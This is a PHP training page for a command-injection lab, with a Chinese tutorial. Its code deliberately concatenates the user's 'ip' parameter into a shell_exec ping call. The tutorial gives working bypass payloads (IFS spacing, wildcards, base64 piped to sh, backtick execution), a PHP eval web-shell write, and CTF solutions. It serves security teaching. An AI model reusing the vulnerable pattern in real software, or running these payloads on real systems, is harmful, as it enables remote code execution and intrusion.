<?php
/**
 * 故意存在命令注入：用户输入拼入 ping 命令（仅授权靶场）
 */
$ip = isset($_GET['ip']) ? $_GET['ip'] : '127.0.0.1';
$cmd = 'ping -c 1 ' . $ip . ' 2>&1';
$output = shell_exec($cmd);
if ($output === null) {
    $output = '(无输出或执行失败)';
}
?>
<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Ping 命令执行（RCE）演示</title>
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: Arial, "Microsoft YaHei", sans-serif; background: #f4f5f7; color: #1f2937; font-size: 14px; }
        .wrap { max-width: 1200px; margin: 16px auto; padding: 0 16px; }
        .card { background: #fff; border-radius: 10px; padding: 16px 18px; box-shadow: 0 4px 12px rgba(0,0,0,.06); margin-bottom: 12px; }
        .card.compact { padding: 12px 16px; }
        h1 { margin: 0 0 8px; font-size: 1.35rem; }
        h2 { margin: 0 0 8px; font-size: 1.05rem; color: #111827; }
        h3 { margin: 10px 0 6px; font-size: 0.95rem; }
        p, li { line-height: 1.55; margin: 6px 0; }
        .muted { color: #6b7280; font-size: 13px; }
        code { background: #eef2ff; padding: 1px 6px; border-radius: 4px; font-size: 13px; }
        pre { background: #111827; color: #e5e7eb; padding: 10px 12px; border-radius: 8px; overflow: auto; font-size: 12px; line-height: 1.45; margin: 8px 0; }
        .split { display: grid; grid-template-columns: 1fr 380px; gap: 16px; align-items: start; }
        @media (max-width: 960px) {
            .split { grid-template-columns: 1fr; }
            .panel-right { position: static !important; }
        }
        .panel-left .card:last-child { margin-bottom: 0; }
        .panel-right {
            position: sticky;
            top: 12px;
        }
        .panel-right textarea {
            width: 100%;
            min-height: 88px;
            padding: 10px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            font-family: Consolas, monospace;
            font-size: 13px;
        }
        .panel-right input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            font-family: Consolas, monospace;
            font-size: 13px;
        }
        .panel-right button {
            margin-top: 10px;
            padding: 10px 18px;
            border: none;
            border-radius: 8px;
            background: #2563eb;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
        }
        .out { background: #f9fafb; border: 1px solid #e5e7eb; border-radius: 8px; padding: 12px; margin-top: 12px; max-height: 320px; overflow: auto; white-space: pre-wrap; word-break: break-all; font-family: Consolas, monospace; font-size: 12px; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 8px 0; }
        th, td { border: 1px solid #e5e7eb; padding: 6px 8px; text-align: left; }
        th { background: #f3f4f6; }
        .warn { background: #fef3c7; border: 1px solid #fcd34d; color: #92400e; padding: 8px 10px; border-radius: 8px; font-size: 13px; margin: 8px 0; }
        ul, ol { margin: 6px 0 6px 1.2em; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card compact">
        <h1>Ping 页面的命令执行（命令注入）</h1>
        <p class="muted">本环境为 <strong>Linux</strong>（Alpine）。后端将参数 <code>ip</code> 拼入 <code>ping -c 1 …</code> 执行，存在<strong>命令注入</strong>。Windows 下管道与命令名不同，见下方说明。</p>
    </div>

    <div class="split">
        <div class="panel-left">
            <div class="card">
                <h2>1、管道符与命令连接</h2>
                <p>多条命令或连接上游输出时常用：</p>
                <table>
                    <tr><th>符号</th><th>含义（简述）</th></tr>
                    <tr><td><code>;</code></td><td>顺序执行，前面成败不影响后面</td></tr>
                    <tr><td><code>|</code></td><td>管道：前一命令 stdout 给后一命令 stdin</td></tr>
                    <tr><td><code>&amp;</code></td><td>后台运行（与 bash 任务控制相关）</td></tr>
                    <tr><td><code>||</code></td><td>前一命令失败才执行后一</td></tr>
                    <tr><td><code>&&</code></td><td>前一命令成功才执行后一</td></tr>
                </table>
                <p class="muted">Windows 查看端口示例： <code>netstat -antp | find "3389"</code>。本机为 Linux，可试：<code>netstat -antp | grep 3389</code> 或 <code>ss -lntp | grep 3389</code>（需 root 时部分信息才全）。</p>
            </div>

            <div class="card">
                <h2>2、过滤空格时的替代</h2>
                <ul>
                    <li><code>%09</code>（Tab，在 URL 中编码传递）</li>
                    <li><code>$IFS$9</code></li>
                    <li><code>${IFS}</code></li>
                </ul>
                <p>示例（本页参数）：<code>127.0.0.1;cat$IFS$9/flag</code></p>
            </div>

            <div class="card">
                <h2>3、通配符</h2>
                <p><code>?</code> 匹配单个字符，<code>*</code> 匹配多段。若关键字（如 <code>flag</code>）被过滤，可尝试路径级通配：</p>
                <pre>cat /flag
cat /f???
cat /f*</pre>
                <p class="muted">注意：在命令名位置不能随便用通配符（如 <code>c?t</code> 未必能解析到 <code>cat</code>）；对<strong>二进制可执行文件</strong>通常用<strong>绝对路径</strong>才稳定，例如 <code>/bin/c?t</code> 指向 <code>/bin/cat</code>。</p>
            </div>

            <div class="card">
                <h2>4、同等功能的命令</h2>
                <p>读文件：可尝试替换链（视环境而定）：<code>cat</code> → <code>tac</code> → <code>less</code> → <code>head</code> → <code>vi</code> → <code>od -a</code> 等。</p>
            </div>

            <div class="card">
                <h2>5、关键字被过滤</h2>
                <p>拆分或转义字符，例如：<code>c'a't</code>、<code>ca\t</code>（仍被 shell 解析为 <code>cat</code>）。</p>
            </div>

            <div class="card">
                <h2>6、内联执行（反引号 / $()）</h2>
                <p>先执行内层命令，结果作为外层参数。例如：<code>cat `ls`</code> 会列出当前目录下文件名再交给 <code>cat</code>。</p>
                <p><strong>读取 <code>hhh/</code> 目录下的 flag：</strong>先进入目录再对内层 <code>ls</code> 结果做 <code>cat</code>：</p>
                <pre>127.0.0.1;cd$IFS$9hhh&&cat$IFS$9`ls`</pre>
                <p class="muted">（<code>hhh</code> 下仅有 flag 文件时，<code>ls</code> 输出文件名，<code>cat</code> 读取当前目录下该文件。）</p>
            </div>

            <div class="card">
                <h2>7、Base64</h2>
                <p>把命令编码后解码执行，绕过简单关键字过滤：</p>
                <pre>127.0.0.1;echo Y2F0IC9mbGFn | base64 -d | sh</pre>
                <p class="muted"><code>Y2F0IC9mbGFn</code> 为 <code>cat /flag</code> 的 Base64。</p>
            </div>

            <div class="card">
                <h2>8、拼接</h2>
                <p>利用变量、花括号、引号等把关键字拆成多段再拼回，例如：<code>a=c;b=at;$a$b</code>（视过滤规则与 shell 而定）。</p>
            </div>

            <div class="card">
                <h2>9、写文件（先写 txt 再改 php）</h2>
                <p class="warn">仅用于授权靶场，禁止用于未授权系统。</p>
                <p>示例思路：先写入 <code>.txt</code>，再重命名或追加为 <code>.php</code>；也可直接 Base64 解码写入。</p>
                <pre>127.0.0.1;echo "&lt;?php eval(\$_POST[w]);?&gt;" &gt; writable/shell.txt
127.0.0.1;echo "PD9waHAgZXZhbCgkX1BPU1Rbd10pOz8+"|base64 -d|tee writable/shell.txt</pre>
                <p class="muted">本环境提供可写目录 <code>writable/</code>（仅演示）。</p>
            </div>

            <div class="card">
                <h2>阶段性练习 1</h2>
                <p>目标：读取网站根目录下的 key（见 <code>key.php</code>）。</p>
                <p>示例思路（参考）：<code>127.0.0.1;l's' ../</code>、<code>127.0.0.1;c'a't$IFS$9../key.php</code>（路径需按实际目录调整）。</p>
            </div>

            <div class="card">
                <h2>阶段性练习 2（BUUCTF Ping Ping Ping）</h2>
                <p>三种常见思路（题目环境以在线为准，同一题可用不同过滤绕过）：</p>
                <ol>
                    <li>内联列举文件名 + 空格绕过：<code>127.0.0.1;cat$IFS$9`ls`</code></li>
                    <li>Base64 解码后交给 <code>sh</code>：<code>127.0.0.1;echo$IFS$9dGFjIGZsYWcucGhw|base64$IFS$9-d|sh</code>（中间 Base64 与文件名随题改）</li>
                    <li>通配符 / 等价命令：<code>127.0.0.1;tac$IFS$9/f*</code> 或 <code>127.0.0.1;ca\t$IFS$9/flag</code> 等</li>
                </ol>
                <p class="muted">历史题目 URL 示例（可能失效）：<code>?ip=127.0.0.1;cat$IFS$9`ls`</code>、<code>?ip=127.0.0.1;echo$IFS$9…|base64$IFS$9-d|sh</code>（见 README）。</p>
            </div>
        </div>

        <div class="panel-right">
            <div class="card">
                <h2>执行区</h2>
                <form method="get" action="/index.php">
                    <label class="muted">参数 <code>ip</code>（整段拼在 ping 后面）</label>
                    <input type="text" name="ip" value="<?php echo htmlspecialchars($ip, ENT_QUOTES, 'UTF-8'); ?>" placeholder="127.0.0.1;cat /flag">
                    <button type="submit">执行</button>
                </form>
                <p class="muted">等价访问：<code>?ip=</code> 后接 payload</p>
                <p class="muted">实际执行的命令：</p>
                <pre style="margin-top:6px;"><?php echo htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8'); ?></pre>
                <h3>输出</h3>
                <div class="out"><?php echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8'); ?></div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
